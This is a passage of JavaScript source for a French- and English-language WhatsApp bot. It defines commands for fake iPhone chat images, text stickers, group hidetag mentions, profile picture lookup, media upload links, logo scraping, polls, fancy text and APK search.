              `${prefix}iphone ${text}`,

            buttonText: {
              displayText:
                "🔄 REGENERATE"
            },

            type: 1
          },

          {
            buttonId:
              `${prefix}menu`,

            buttonText: {
              displayText:
                "📋 MENU"
            },

            type: 1
          }

        ],

        headerType: 4,

        contextInfo: {

          newsletterJid:
            "120363426341519710@newsletter",

          newsletterName:
            "𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓",

          externalAdReply: {

            title:
              "ᴅєν уσυ ɪᴘʜᴏɴᴇ ғᴀᴋᴇᴄʜᴀᴛ",

            body:
              "ᴘᴏᴡᴇʀᴇᴅ ʙʏ уσυ тє¢н",

            thumbnailUrl:
              apiUrl,

            mediaType: 1,

            renderLargerThumbnail: true,

            sourceUrl:
              apiUrl

          }

        }

      },
      { quoted: msg }
    );

    // ================= SUCCESS =================

    react("✅");

  } catch (e) {

    console.error(
      "IPHONE ERROR =>",
      e
    );

    react("❌");

    await socket.sendMessage(
      from,
      {
        text:
`╭┈┈『 ❌ ERROR 』
│
│ FAILED TO GENERATE
│ IPHONE FAKE CHAT
│
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      },
      { quoted: msg }
    );

  }

}
break;

case 'write': {

  try {

    react("✍️");

    // ================= TEXT =================

    const text =
      args.join(" ").trim();

    // ================= CHECK =================

    if (!text) {

      react("❌");

      return await socket.sendMessage(
        from,
        {
          text:
`╭┈┈『 ✍️ WRITE STICKER 』
│
│ ❌ ENTER SOME TEXT
│
│ 📌 EXAMPLE :
│ .write Hello World
│
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
        },
        { quoted: msg }
      );

    }

    // ================= MODULES =================

    const {
      createCanvas
    } = require("canvas");

    const sharp =
      require("sharp");

    // ================= CANVAS =================

    const canvas =
      createCanvas(2048, 2048);

    const ctx =
      canvas.getContext("2d");

    // ================= BACKGROUND =================

    ctx.fillStyle =
      "#000000";

    ctx.fillRect(
      0,
      0,
      canvas.width,
      canvas.height
    );

    // ================= TEXT STYLE =================

    ctx.fillStyle =
      "#ffffff";

    ctx.font =
      "bold 120px Sans";

    ctx.textAlign =
      "center";

    ctx.textBaseline =
      "middle";

    // ================= SHADOW =================

    ctx.shadowColor =
      "rgba(0,0,0,0.9)";

    ctx.shadowBlur =
      25;

    ctx.lineWidth =
      10;

    ctx.strokeStyle =
      "#000000";

    // ================= WRAP TEXT =================

    const words =
      text.split(" ");

    let line = "";
    let lines = [];

    for (const word of words) {

      const testLine =
        line + word + " ";

      if (
        testLine.length > 18
      ) {

        lines.push(line);

        line =
          word + " ";

      } else {

        line =
          testLine;

      }

    }

    if (line)
      lines.push(line);

    // ================= POSITION =================

    const x =
      canvas.width / 2;

    const startY =
      canvas.height / 2 -
      (
        lines.length * 70
      );

    // ================= DRAW =================

    lines.forEach(
      (l, i) => {

        const y =
          startY +
          (i * 140);

        ctx.strokeText(
          l.trim(),
          x,
          y
        );

        ctx.fillText(
          l.trim(),
          x,
          y
        );

      }
    );

    // ================= BUFFER =================

    const pngBuffer =
      canvas.toBuffer(
        "image/png"
      );

    // ================= WEBP =================

    const sticker =
      await sharp(pngBuffer)

        .resize(512, 512)

        .webp({
          quality: 100
        })

        .toBuffer();

    // ================= SEND =================

    await socket.sendMessage(
      from,
      {

        sticker: sticker,

        contextInfo: {

          newsletterJid:
            "120363426341519710@newsletter",

          newsletterName:
            "𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓",

          externalAdReply: {

            title:
              "ᴅєν уσυ ᴡʀɪᴛᴇ sᴛɪᴄᴋᴇʀ",

            body:
              "ᴘᴏᴡᴇʀᴇᴅ ʙʏ уσυ тє¢н",

            thumbnailUrl:
              "https://i.postimg.cc/hGD0FkT5/file-00000000ee0c720c90258685675507d2.png",

            mediaType: 1,

            renderLargerThumbnail: true,

            sourceUrl:
              "https://whatsapp.com/channel/120363426341519710"

          }

        }

      },
      { quoted: msg }
    );

    react("✅");

  } catch (e) {

    console.error(
      "WRITE ERROR =>",
      e
    );

    react("❌");

    await socket.sendMessage(
      from,
      {
        text:
`╭┈┈『 ❌ ERROR 』
│
│ FAILED TO CREATE
│ WRITE STICKER
│
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      },
      { quoted: msg }
    );

  }

}
break;


case 'tag':
case 'hidetag':
case 'h': {
  if (!from.endsWith('@g.us')) {
    await socket.sendMessage(from, { text: '❗ Utilise cette commande dans un groupe.' }, { quoted: msg });
    break;
  }

  try {

    // ===== REACT =====
    await socket.sendMessage(from, {
      react: {
        text: "📢",
        key: msg.key
      }
    });

    const { participants } = await require('./normalize').getGroupAdminsInfo(socket, from);

    const text = args.join(' ').trim();
    if (!text) {
      await socket.sendMessage(from, { text: 'Usage: . hidetag <message>' }, { quoted: msg });
      break;
    }

    const mentions = participants.map(p => p.jid).filter(Boolean);

    const payloadText = `${text}`;

    await socket.sendMessage(from, {
      text: payloadText,
      mentions,
      buttons: [
        {
          buttonId: ".menu",
          buttonText: { displayText: "📜 ᴍᴇɴᴜ" },
          type: 1
        },
        {
          buttonId: ".repo",
          buttonText: { displayText: "📦 ʀᴇᴘᴏ" },
          type: 1
        }
      ],
      headerType: 1,
      contextInfo: {
        mentionedJid: mentions
      }
    }, { quoted: msg });

    try {
      await socket.sendMessage(from, { delete: msg.key });
    } catch (e) {}

  } catch (e) {
    console.error('HIDETAG ERROR', e);

    await socket.sendMessage(from, {
      text: `❌ Erreur: ${e.message || e}`
    }, { quoted: msg });
  }

  break;
}


case 'getpp': {
  try {

    const q =
      msg.message?.conversation?.split(" ")[1] ||
      msg.message?.extendedTextMessage?.text?.split(" ")[1];

    // ===== REPLY SUPPORT =====
    const replyJid =
      msg.message?.extendedTextMessage?.contextInfo?.participant;

    let targetNumber;

    if (q) {
      targetNumber = q;
    } else if (replyJid) {
      targetNumber = replyJid.split('@')[0];
    } else {
      return await socket.sendMessage(sender, {
        text: "❌ Veuillez fournir un numéro ou répondre à un message.\n\nEx: .getpp 509xxxxxx"
      }, { quoted: msg });
    }

    const jid = targetNumber.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    // ===== REACT =====
    await socket.sendMessage(sender, {
      react: {
        text: "🖼",
        key: msg.key
      }
    });

    // ===== PROFILE PICTURE =====
    let ppUrl;

    try {
      ppUrl = await socket.profilePictureUrl(jid, "image");
    } catch {
      ppUrl = "https://telegra.ph/file/4cc2712eaba1c5c1488d3.jpg";
    }

    // ===== BOT NAME SAFE =====
    const botName =
      config?.BOT_NAME ||
      "BASEBOT-MD";

    // ===== META =====
    const metaQuote = {
      key: {
        remoteJid: "status@broadcast",
        participant: "0@s.whatsapp.net",
        fromMe: false,
        id: "META_AI_GETPP"
      },
      message: {
        contactMessage: {
          displayName: botName,
          vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${botName};;;;\nFN:${botName}\nEND:VCARD`
        }
      }
    };

    // ===== TEXT =====
    const text = `
╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
┆ 🖼 *PROFILE PICTURE*
┆ 📞 +${targetNumber}
┆ 🤖 ${botName}
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
`.trim();

    // ===== BUTTONS =====
    const buttons = [
      {
        buttonId: '.menu',
        buttonText: { displayText: '📋 ᴍᴇɴᴜ' },
        type: 1
      },
      {
        buttonId: '.repo',
        buttonText: { displayText: '📦 ʀᴇᴘᴏ' },
        type: 1
      }
    ];

    // ===== SEND =====
    await socket.sendMessage(sender, {
      image: { url: ppUrl },
      caption: text,
      footer: 'ᴍᴀᴅᴇ ɪɴ ʙʏ ʏᴏᴜ ᴛᴇᴄʜx',
      buttons,
      headerType: 4,
      contextInfo: {
        mentionedJid: [jid]
      }
    }, { quoted: metaQuote });

  } catch (e) {
    console.error("GETPP ERROR:", e);

    await socket.sendMessage(sender, {
      text: "❌ Error while fetching profile picture"
    }, { quoted: msg });
  }

  break;
}

case 'getcase': {
  try {

    // ================= OWNER ONLY =================
    if (!isOwner) {
      react("❌");
      return await socket.sendMessage(from, {
        text:
`╭┈┈『 ❌ ACCESS DENIED 』
│
│ 🔒 OWNER ONLY COMMAND
│ Cette commande est
│ réservée au propriétaire
│
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      }, { quoted: msg });
    }

    react("📂");

    // ================= CHECK ARG =================
    const caseName = args[0]?.toLowerCase().trim();

    if (!caseName) {
      react("❌");
      return await socket.sendMessage(from, {
        text:
`╭┈┈『 📦 GETCASE 』
│
│ ❌ Entrez un nom de case
│
│ 📌 EXEMPLES :
│ .getcase play
│ .getcase menu
│ .getcase ig
│ .getcase tt
│
│ 💡 .listcases — voir
│    toutes les cases
│
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      }, { quoted: msg });
    }

    // ================= READ FILE =================
    const _fs   = require("fs");
    const _path = require("path");

    // Cherche pair.js dans __dirname ou process.cwd()
    let filePath = _path.join(__dirname, "pair.js");
    if (!_fs.existsSync(filePath)) {
      filePath = _path.join(process.cwd(), "pair.js");
    }

    if (!_fs.existsSync(filePath)) {
      react("❌");
      return await socket.sendMessage(from, {
        text:
`╭┈┈『 ❌ ERROR 』
│
│ pair.js INTROUVABLE
│ Vérifiez le chemin
│
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      }, { quoted: msg });
    }

    const content = _fs.readFileSync(filePath, "utf8");

    // ================= REGEX AMÉLIORÉ =================
    // Supporte : case 'x': { ... break; } ET case 'x': ... break;
    // Aussi supporte plusieurs aliases : case 'x': case 'y': { ...
    const escapedName = caseName.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');

    // Regex 1 : case avec accolade — case 'x': { ... } break;
    let regex = new RegExp(
      `(case\\s+['"\`]${escapedName}['"\`]\\s*:(?:\\s*case\\s+['"\`][^'"\`]+['"\`]\\s*:)*\\s*\\{[\\s\\S]*?\\}\\s*\\n?\\s*break;)`,
      "i"
    );
    let match = content.match(regex);

    // Regex 2 : case sans accolade — case 'x': ... break;
    if (!match) {
      regex = new RegExp(
        `(case\\s+['"\`]${escapedName}['"\`]\\s*:[\\s\\S]*?break;)`,
        "i"
      );
      match = content.match(regex);
    }

    // ================= NOT FOUND =================
    if (!match) {
      react("❌");
      return await socket.sendMessage(from, {
        text:
`╭┈┈『 ❌ NOT FOUND 』
│
│ 🎯 CASE : ${caseName}
│
│ Introuvable dans pair.js
│ Vérifiez l'orthographe
│
│ 💡 .listcases pour voir
│ toutes les commandes
│
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      }, { quoted: msg });
    }

    // ================= CODE =================
    let extractedCode = match[1] || match[0];

    // Tronquer si trop long (WhatsApp limite ~65k chars)
    const MAX_CODE_LEN = 3000;
    const truncated = extractedCode.length > MAX_CODE_LEN;
    if (truncated) {
      extractedCode = extractedCode.slice(0, MAX_CODE_LEN) + "\n\n// ... [TRONQUÉ — trop long]";
    }

    const lineCount = (match[1] || match[0]).split('\n').length;

    // ================= SEND =================
    const infoText =
`╭┈┈『 📦 GETCASE — ${caseName.toUpperCase()} 』
│
│ 🎯 CASE  : ${caseName}
│ 📏 TAILLE : ${(match[1] || match[0]).length} chars
│ 📄 LIGNES : ${lineCount}
│ 📂 SOURCE : pair.js
│${truncated ? '\n│ ⚠️  TRONQUÉ (> 3000 chars)\n│' : ''}
│ 📋 CODE CI-DESSOUS ⬇️
│
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ

> 𝙼𝙰𝙳𝙴 𝙱𝚈 𝚈𝙾𝚄 𝚃𝙴𝙲𝙷𝚇 🎠`;

    // Envoie le header
    await socket.sendMessage(from, {
      text: infoText
    }, { quoted: msg });

    // Envoie le code en document texte pour faciliter la copie
    const codeBuffer = Buffer.from(extractedCode, 'utf8');
    await socket.sendMessage(from, {
      document: codeBuffer,
      mimetype: 'text/plain',
      fileName: `case_${caseName}.js`,
      caption:
`╭┈┈『 📄 case_${caseName}.js 』
│ 📥 Télécharge pour copier
│ le code complet
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
    }, { quoted: msg });

    react("✅");

  } catch (e) {
    console.error("GETCASE ERROR =>", e);
    react("❌");
    await socket.sendMessage(from, {
      text:
`╭┈┈『 ❌ ERREUR GETCASE 』
│
│ ${e.message || 'Erreur inconnue'}
│
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
    }, { quoted: msg });
  }
}
break;

// ============================================================
// LISTCASES — Liste toutes les commandes disponibles (OWNER)
// ============================================================
case 'listcases':
case 'cases': {
  try {
    if (!isOwner) {
      react("❌");
      return await socket.sendMessage(from, {
        text: `╭┈┈『 ❌ ACCESS DENIED 』\n│\n│ 🔒 OWNER ONLY\n│\n╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      }, { quoted: msg });
    }

    react("📋");

    const _fs2   = require("fs");
    const _path2 = require("path");

    let fp = _path2.join(__dirname, "pair.js");
    if (!_fs2.existsSync(fp)) fp = _path2.join(process.cwd(), "pair.js");

    const src = _fs2.readFileSync(fp, "utf8");

    // Extrait tous les noms de cases uniques
    const caseMatches = [...src.matchAll(/case\s+['"`]([^'"`]+)['"`]\s*:/g)];
    const uniqueCases = [...new Set(caseMatches.map(m => m[1]))].sort();

    // Groupe par catégorie (heuristique)
    const cats = {
      '⬇️  DOWNLOAD':   ['play','song','ytmp4','video','ig','facebook','fbdl','fb','tt','tiktok','mediafire','mf','mfdl'],
      '🖼️  IMAGE':      ['remini','enhance','hd','removebg','rmbg','toimage','getimage','wasted','wanted','iphonequote','fakechat','iphone','couplepp','ppcp','phlogo','pornhub','ph','write','logo','tech','technologia','qrcode','qr'],
      '👥  GROUPE':     ['tagall','tagall2','tagadmins','tag','hidetag','h','kick','add','promote','kickall','listadmin','creategroup','cgroup','antilink','antimentions','antisticker','antibot','antispam','antidemote','firstadmin','welcome','goodbye'],
      '⚙️  CONFIG':     ['config','showconfig','resetconfig','setprefix','setpath','getpath','mode private','mode public','private','public','antitag','delsession'],
      '🔧  OWNER':      ['getcase','listcases','cases','getpp','gjid','groupjid','grouplist','ownerlist','addadmin','deladmin','cid','active','bots','breact'],
      '🎮  FUN':        ['bratvid','bratvideo','fancy','fancytext','style','wm','take','tgsticker','tgs','telesticker','tourl','url','tourl2','toimage','ssweb','ss','vv','viewonce','translate','tl','trt','tr','joke','password','calc','b64','shorturl','whois','weather','lyrics'],
      '💬  BOT':        ['chatbot','bot','uptime','ping','test','menu','allmenu','help','youx','menu2','bugmenu','repo','owner','pair','code','send','sendme','save','post','statusgc','poststatus','bible','verset','jid','gjid'],
    };

    const categorized = new Set();
    let text = `╭┈┈『 📋 LISTE DES CASES 』\n│\n│ 📊 Total : ${uniqueCases.length} cases\n│\n`;

    for (const [catName, catCases] of Object.entries(cats)) {
      const found = catCases.filter(c => uniqueCases.includes(c));
      if (!found.length) continue;
      text += `│ ${catName}\n`;
      found.forEach(c => { text += `│  • .${c}\n`; categorized.add(c); });
      text += `│\n`;
    }

    // Cases non catégorisées
    const others = uniqueCases.filter(c => !categorized.has(c));
    if (others.length) {
      text += `│ 📦 AUTRES\n`;
      others.forEach(c => { text += `│  • .${c}\n`; });
      text += `│\n`;
    }

    text += `╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ\n\n> 💡 .getcase <nom> pour voir le code`;

    await socket.sendMessage(from, { text }, { quoted: msg });
    react("✅");

  } catch (e) {
    react("❌");
    await socket.sendMessage(from, { text: `❌ LISTCASES ERROR: ${e.message}` }, { quoted: msg });
  }
}
break;

case 'tourl':
case 'url':
case 'tourl2': {
  try {

    // ===== REACT =====
    await socket.sendMessage(sender, {
      react: { text: "🖇", key: msg.key }
    });

    const axios = require("axios");
    const FormData = require("form-data");

    // ===== GET CONTEXT PROPERLY =====
    const contextInfo =
      msg.message?.extendedTextMessage?.contextInfo ||
      msg.message?.imageMessage?.contextInfo ||
      msg.message?.videoMessage?.contextInfo ||
      msg.message?.audioMessage?.contextInfo ||
      msg.message?.documentMessage?.contextInfo;

    const quoted = contextInfo?.quotedMessage;

    if (!quoted) {
      return await socket.sendMessage(sender, {
        text: `❌ ${toSmallCaps("reply to a media (image/video/audio/document)")}`
      }, { quoted: msg });
    }

    // ===== TYPE DETECTION =====
    const type =
      quoted.imageMessage ? "imageMessage" :
      quoted.videoMessage ? "videoMessage" :
      quoted.audioMessage ? "audioMessage" :
      quoted.documentMessage ? "documentMessage" :
      null;

    if (!type) {
      return await socket.sendMessage(sender, {
        text: `❌ ${toSmallCaps("unsupported media")}`
      }, { quoted: msg });
    }

    // ===== DOWNLOAD =====
    const mediaMsg = quoted[type];

    const stream = await downloadContentFromMessage(
      mediaMsg,
      type.replace("Message", "")
    );

    let chunks = [];
    for await (const c of stream) chunks.push(c);
    const mediaBuffer = Buffer.concat(chunks);

    // ===== FILE EXTENSION =====
    const mimeType = mediaMsg.mimetype || "";

    let extension = ".bin";
    if (mimeType.includes("jpeg")) extension = ".jpg";
    else if (mimeType.includes("png")) extension = ".png";
    else if (mimeType.includes("webp")) extension = ".webp";
    else if (mimeType.includes("mp4")) extension = ".mp4";
    else if (mimeType.includes("audio")) extension = ".mp3";
    else if (mimeType.includes("pdf")) extension = ".pdf";

    const fileName = `you_md_${Date.now()}${extension}`;

    // ===== CATBOX UPLOAD =====
    const form = new FormData();
    form.append("reqtype", "fileupload");
    form.append("fileToUpload", mediaBuffer, fileName);

    const catboxRes = await axios.post(
      "https://catbox.moe/user/api.php",
      form,
      { headers: form.getHeaders() }
    );

    const catboxUrl = catboxRes.data;

    // ===== POSTIMAGES UPLOAD =====
    const postForm = new FormData();
    postForm.append("file", mediaBuffer, fileName);

    const postRes = await axios.post(
      "https://postimages.org/json/rr",
      postForm,
      { headers: postForm.getHeaders() }
    ).catch(() => null);

    const postUrl = postRes?.data?.url || "❌ failed";

    // ===== RESPONSE =====
    const text = `
╭┄┄┄┄┄┄┄┄┄┄┄ᕗ
│ 🌐 𝐔𝐏𝐋𝐎𝐀𝐃 𝐒𝐔𝐂𝐂𝐄𝐒𝐒
│
│ 🔗 ᴄᴀᴛʙᴏx:
│ ${catboxUrl}
│
│ 🔗 ᴘᴏsᴛɪᴍᴀɢᴇ:
│ ${postUrl}
╰┄┄┄┄┄┄┄┄┄┄┄ᕗ
`.trim();

    await socket.sendMessage(sender, {
      text,
      contextInfo: {
        externalAdReply: {
          showAdAttribution: false,
          title: "UPLOAD SUCCESS",
          body: "YOU WEB BOT",
          thumbnailUrl: catboxUrl,
          sourceUrl: catboxUrl,
          mediaType: 1,
          renderLargerThumbnail: true
        }
      }
    }, { quoted: msg });

  } catch (e) {
    console.error("TOURL ERROR:", e);

    await socket.sendMessage(sender, {
      text: `❌ ${e.message || e}`
    }, { quoted: msg });
  }
}
break;

case 'bot': {
    try {

        const fs = require("fs");

        // ===== REACT =====
        await socket.sendMessage(sender, {
            react: {
                text: "🤖",
                key: msg.key
            }
        });

        // ===== STATS =====
        const speed = 1;
        const uptime = process.uptime();
        const h = Math.floor(uptime / 3600);
        const m = Math.floor((uptime % 3600) / 60);
        const s = Math.floor(uptime % 60);
        const ram = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2);
        const user = msg.pushName || "User";

        const text = `
╭──〔 🤖 YOU WEB BOT 〕
│ 👤 ${user}
│ ⚡ ${speed} ms
│ 🧠 ${ram} MB
│ ⏱ ${h}h ${m}m ${s}s
│ 🚀 ONLINE
╰────────────────⬣
`;

        const image = fs.readFileSync("./menu6.jpg");

        // ===== TEMPLATE BUTTON =====
        await socket.sendMessage(sender, {
            image: image,
            caption: text,
            footer: "YOU WEB BOT",
            templateButtons: [
                {
                    index: 1,
                    quickReplyButton: {
                        displayText: "⚡ Alive",
                        id: ".alive"
                    }
                },
                {
                    index: 2,
                    quickReplyButton: {
                        displayText: "🧪 Test",
                        id: ".test"
                    }
                },
                {
                    index: 3,
                    urlButton: {
                        displayText: "🌐 Website",
                        url: "https://ton-site.com"
                    }
                }
            ]
        }, { quoted: msg });

    } catch (e) {
        console.log(e);
        await socket.sendMessage(sender, {
            text: "❌ Error bot menu"
        }, { quoted: msg });
    }
}
break;


case 'logo': {
    try {

        const fs = require("fs");

        // IMAGE MENU SI PAS D'ARGUMENT
        if (!args.length) {
            return sock.sendMessage(from, {
                image: fs.readFileSync('./menu6.jpg'),
                caption: `
╭━━━〔 🤖 YOU WEB BOT LOGO 〕
┃
┃ 🎨 Utilisation :
┃ logo <type> <texte>
┃
┃ 📌 Exemples :
┃ logo neonlight King
┃ logo dragonball Empire
┃ logo naruto Uzumaki
┃
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
                `,
                footer: "YOU WEB BOT",
                buttons: [
                    {
                        buttonId: "alive",
                        buttonText: { displayText: "🤖 Test Bot" },
                        type: 1
                    },
                    {
                        buttonId: "website",
                        buttonText: { displayText: "🌐 Website" },
                        type: 1
                    }
                ],
                headerType: 4
            }, { quoted: msg });
        }

        const type = args[0].toLowerCase();
        const text = args.slice(1).join(" ");

        if (!text) return reply("❌ Donne un texte.");

        const logos = {
            neonlight: "https://en.ephoto360.com/create-colorful-neon-light-text-effects-online-797.html",
            dragonball: "https://en.ephoto360.com/create-dragon-ball-style-text-effects-online-809.html",
            naruto: "https://en.ephoto360.com/naruto-shippuden-logo-style-text-effect-online-808.html",
            deadpool: "https://en.ephoto360.com/create-text-effects-in-the-style-of-the-deadpool-logo-818.html",
            blackpink: "https://en.ephoto360.com/create-a-blackpink-style-logo-with-members-signatures-810.html"
        };

        if (!logos[type]) {
            return reply("❌ Type invalide.\nEx: neonlight, dragonball, naruto");
        }

        const url = logos[type];

        const res = await axios.get(url);
        const $ = cheerio.load(res.data);
        const token = $('input[name="token"]').attr('value');

        const form = new URLSearchParams();
        form.append("text[]", text);
        form.append("token", token);
        form.append("submit", "Go");

        const result = await axios.post(url, form, {
            headers: {
                "content-type": "application/x-www-form-urlencoded"
            }
        });

        const $2 = cheerio.load(result.data);
        const image = $2("img").attr("src");

        if (!image) return reply("❌ Erreur génération logo.");

        await sock.sendMessage(from, {
            image: { url: image },
            caption: `✨ Logo généré avec succès\n\n🎨 Type: ${type}\n📝 Texte: ${text}`
        }, { quoted: msg });

    } catch (e) {
        console.log(e);
        reply("❌ Erreur logo system.");
    }
}
break;


case 'tech':
case 'technologia': {
  try {

    // ===== REACT =====
    await socket.sendMessage(sender, {
      react: {
        text: "😂",
        key: msg.key
      }
    });

    // ===== AUDIO URL =====
    const audioUrl = "https://files.catbox.moe/f4wjnk.mp3";

    // ===== SEND AUDIO =====
    await socket.sendMessage(sender, {
      audio: { url: audioUrl },

      mimetype: "audio/mpeg",
      ptt: true,

      fileName: "technologia.mp3",

      contextInfo: {
        forwardingScore: 999,
        isForwarded: true,

        externalAdReply: {
          showAdAttribution: false,
          title: "𝐘𝐎𝐔 𝐌𝐃 𝐀𝐔𝐃𝐈𝐎",
          body: "Technologia System",

          thumbnailUrl:
            "https://i.postimg.cc/hGD0FkT5/file-00000000ee0c720c90258685675507d2.png",

          mediaType: 1,
          renderLargerThumbnail: true,

          sourceUrl:
            "https://whatsapp.com/channel/0029Vb7EpGwBlHpXKNgFET1Z"
        }
      }

    }, {
      quoted: msg
    });

  } catch (e) {

    console.error("TECH ERROR:", e);

    await socket.sendMessage(sender, {
      react: {
        text: "❌",
        key: msg.key
      }
    });

    await socket.sendMessage(sender, {
      text:
`❌ *Technologia Failed!*

Error:
${e.message}`
    }, { quoted: msg });

  }
}
break;


      case 'poll': {
    try {

        // ===== REACT =====
        await socket.sendMessage(sender, {
            react: {
                text: "🗳️",
                key: msg.key
            }
        });

        // ===== GET TEXT =====
        const input =
            body ||
            text ||
            "";

        // ===== SPLIT =====
        let [question, optionsString] =
            input.split(";");

        // ===== CHECK =====
        if (!question || !optionsString) {

            return await socket.sendMessage(sender, {
                text: `
╭┄┄『 𝐏𝐎𝐋𝐋 𝐂𝐎𝐌𝐌𝐀𝐍𝐃 』
│ 📌 *${toSmallCaps("usage")}*
│
│ ${prefix}poll question;
│ option1,option2,option3
╰┄┄┄┄┄┄┄┄┄┄┄ᕗ

> *ᴍᴀᴅᴇ ɪɴ ʙʏ ʏᴏᴜ ᴛᴇᴄʜx🌙*
`.trim()
            }, { quoted: msg });
        }

        // ===== OPTIONS =====
        let options = [];

        for (let opt of optionsString.split(",")) {

            if (opt && opt.trim() !== "") {
                options.push(opt.trim());
            }
        }

        // ===== CHECK OPTIONS =====
        if (options.length < 2) {

            return await socket.sendMessage(sender, {
                text: `
╭┄┄『 𝐏𝐎𝐋𝐋 𝐄𝐑𝐑𝐎𝐑 』
│ ❌ *${toSmallCaps("please provide at least 2 options")}*
╰┄┄┄┄┄┄┄┄┄┄┄ᕗ

> *ᴍᴀᴅᴇ ɪɴ ʙʏ ʏᴏᴜ ᴛᴇᴄʜx🌙*
`.trim()
            }, { quoted: msg });
        }

        // ===== CREATE POLL =====
        await socket.sendMessage(sender, {
            poll: {
                name: question.trim(),
                values: options,
                selectableCount: 1
            }
        }, { quoted: msg });

        // ===== SUCCESS MESSAGE =====
        const pollMsg = `
╭┄┄『 𝐏𝐎𝐋𝐋 𝐂𝐑𝐄𝐀𝐓𝐄𝐃 』
│ 🗳️ *${toSmallCaps("poll created successfully")}*
│
│ ❓ *${toSmallCaps("question")}* :
│ ${question.trim()}
│
│ 📊 *${toSmallCaps("options")}* :
│ ${options.length}
╰┄┄┄┄┄┄┄┄┄┄┄ᕗ

> *ᴍᴀᴅᴇ ɪɴ ʙʏ ʏᴏᴜ ᴛᴇᴄʜx🌙*
`.trim();

        // ===== BUTTONS =====
        const buttons = [
            {
                buttonId: '.menu',
                buttonText: {
                    displayText: '📜 ᴍᴇɴᴜ'
                },
                type: 1
            },
            {
                buttonId: '.alive',
                buttonText: {
                    displayText: '⚡ ᴀʟɪᴠᴇ'
                },
                type: 1
            }
        ];

        // ===== SEND INFO =====
        await socket.sendMessage(sender, {
            text: pollMsg,
            footer: "> *ᴍᴀᴅᴇ ɪɴ ʙʏ ʏᴏᴜ ᴛᴇᴄʜx🌙*",
            buttons: buttons,
            headerType: 1,
            contextInfo: {
                forwardingScore: 999,
                isForwarded: true,
                externalAdReply: {
                    title: "𝐘𝐎𝐔 𝐌𝐃 𝐏𝐎𝐋𝐋 🗳️",
                    body: question.trim(),
                    thumbnailUrl: "https://files.catbox.moe/olcxk1.jpg",
                    sourceUrl: "https://whatsapp.com",
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        }, { quoted: msg });

        // ===== DONE =====
        await socket.sendMessage(sender, {
            react: {
                text: "✅",
                key: msg.key
            }
        });

    } catch (e) {

        console.error(e);

        await socket.sendMessage(sender, {
            react: {
                text: "❌",
                key: msg.key
            }
        });

        await socket.sendMessage(sender, {
            text: `
❌ *${toSmallCaps("error while creating poll")}*

${e.message}
`.trim()
        }, { quoted: msg });
    }
}
break;
      
      
case 'fancy':
case 'fancytext':
case 'style': {
  try {

    // Aucun argument → afficher la liste
    if (!args.length) {
      await socket.sendMessage(sender, {
        text:
`╭┄┄「 ⊹ ࣪ ˖ 💫 *𝐅𝐀𝐍𝐂𝐘 𝐒𝐓𝐘𝐋𝐄* ⊹ ࣪ ˖ 」
│. ˚˖𓍢ִ ໋📌 Exemple :
│. ˚˖𓍢ִ໋  ${prefix}fancy 10 YOU MD
│. ˚˖𓍢ִ໋${fancy.list('YOU MD', fancy)}

> ${config.BOT_FOOTER}`
      }, { quoted: msg });
      break;
    }

    const id = parseInt(args[0]);
    const text = args.slice(1).join(" ");

    // Mauvaise utilisation
    if (isNaN(id) || !text) {
      await socket.sendMessage(sender, {
        text:
`❌ Mauvaise utilisation !

📌 Exemple :
  ${prefix}fancy 10 YOU MD

${fancy.list('YOU MD', fancy)}

> ${config.BOT_FOOTER}`
      }, { quoted: msg });
      break;
    }

    const style = fancy[id - 1];

    // Style introuvable
    if (!style) {
      await socket.sendMessage(sender, {
        text: `❌ Style introuvable.\nChoisis un numéro valide.`
      }, { quoted: msg });
      break;
    }

    // Reaction loading
    await socket.sendMessage(from, {
      react: { text: '💫', key: msg.key }
    });

    const result = fancy.apply(style, text);

    // Envoyer résultat
    await socket.sendMessage(sender, {
      text:
`${result}`
    }, { quoted: msg });

    // Reaction success
    await socket.sendMessage(from, {
      react: { text: '✅', key: msg.key }
    });

  } catch (e) {

    console.log("FANCY ERROR:", e);

    await socket.sendMessage(from, {
      react: { text: '❌', key: msg.key }
    });

    await socket.sendMessage(sender, {
      text: `❌ Error while generating fancy text.`
    }, { quoted: msg });
  }

  break;
}
// ============================================================
// APK — Recherche avec carrousel interactif (elaina-baileys)
// ============================================================
case 'apks':
case 'app':
case 'playstore':
case 'mod': {
  try {
    if (!args.length) {
      await socket.sendMessage(sender, {
        text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋📦 *𝐘𝐎𝐔 𝐌𝐎𝐃 𝐀𝐏𝐊*
│. ˚˖𓍢ִ໋❌ *Aucun nom fourni !*
│. ˚˖𓍢ִ໋📌 Usage : ${prefix}apk <nom app>
│. ˚˖𓍢ִ໋💡 Ex: ${prefix}apk WhatsApp
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ

> ${config.BOT_FOOTER}`
      }, { quoted: msg });
      break;
    }

    const query = args.join(' ').trim();

    await socket.sendMessage(from, { react: { text: '🔎', key: msg.key } });

    await socket.sendMessage(sender, {
      text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
